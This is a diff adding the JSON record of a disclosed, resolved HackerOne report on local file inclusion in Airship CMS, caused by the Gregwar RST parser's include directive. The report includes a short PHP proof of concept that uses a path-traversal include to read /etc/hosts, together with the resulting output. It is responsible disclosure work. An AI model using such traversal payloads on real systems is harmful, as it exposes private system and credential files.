@@ -1,0 +1,116 @@
+{
+  "id": 179034,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzkwMzQ=",
+  "url": "https://hackerone.com/reports/179034",
+  "title": "[Airship CMS] Local File Inclusion - RST Parser",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2016-10-30T23:33:43.551Z",
+  "submitted_at": "2016-10-30T23:33:43.551Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "h4ckninja",
+    "url": "/h4ckninja",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8539,
+    "url": "https://hackerone.com/paragonie",
+    "handle": "paragonie",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/539/72f76fed45e5220b47ba2f679371ebf9ccb19c70_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/539/72f76fed45e5220b47ba2f679371ebf9ccb19c70_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Paragon Initiative Enterprises",
+      "twitter_handle": "ParagonIE",
+      "website": "https://github.com/paragonie",
+      "about": "Cryptography and Application Security Consultants - We Produce Various Open Source Libraries"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2016-10-31T13:00:04.983Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2016-10-31T12:59:43.485Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Airship uses the very useful RST Parser from Gregwar. However, the parser has the RST directive `include` built-in (why it isn't a separate directive per the spec, I don't know). However, as a result, LFI is possible in Airship.\n\nI realize this isn't directly Paragonie's code, but since Airship uses this library, I wanted to let you know. I found two instances in the Airship codebase and don't appear to take this side effect in to account:\n\nhttps://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/Cabin/Hull/Landing/CustomPages.php#L186\n\nhttps://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/lens_functions.php#L714\n\nThe parser has this problem here:\n\nhttps://github.com/Gregwar/RST/blob/master/Parser.php#L762. There doesn't appear to be a way for users of this library to turn it off short of re-implementing their own parser. The spec itself recognizes this security impact: http://docutils.sourceforge.net/docs/ref/rst/directives.html#include.\n\nTo demonstrate:\n\n`rst.php`:\n\n~~~\n<?php\n\nrequire('autoload.php');\n\n\n$parser = new Gregwar\\RST\\Parser;\n\n// RST document\n$document = '*Test*\n\n.. include:: /./../../../../../../../../../../../../../../../../../../etc/hosts\n\n``test``\n';\n\n// Parse it\n$html = $parser->parse($document);\n\n// Render it\necho $html;\n~~~\n\nOutput:\n\n~~~\n$ php rst.php\n<p><em>Test</em></p>\n<p>##\n# Host Database\n#\n# localhost is used to configure the loopback interface\n# when the system is booting.  Do not change this entry.\n##\n127.0.0.1\tlocalhost\n255.255.255.255\tbroadcasthost\n::1             localhost </p>\n\n[...]\n~~~\n\n\n\n",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2016-11-30T12:59:43.528Z",
+  "allow_singular_disclosure_after": -297829661.69592535,
+  "singular_disclosure_allowed": true,
+  "vote_count": 7,
+  "voters": [
+    "static",
+    "zack0x01",
+    "madrobot",
+    "muhammad_uwais",
+    "ibram",
+    "bastianwelfrid",
+    "spetr0x"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
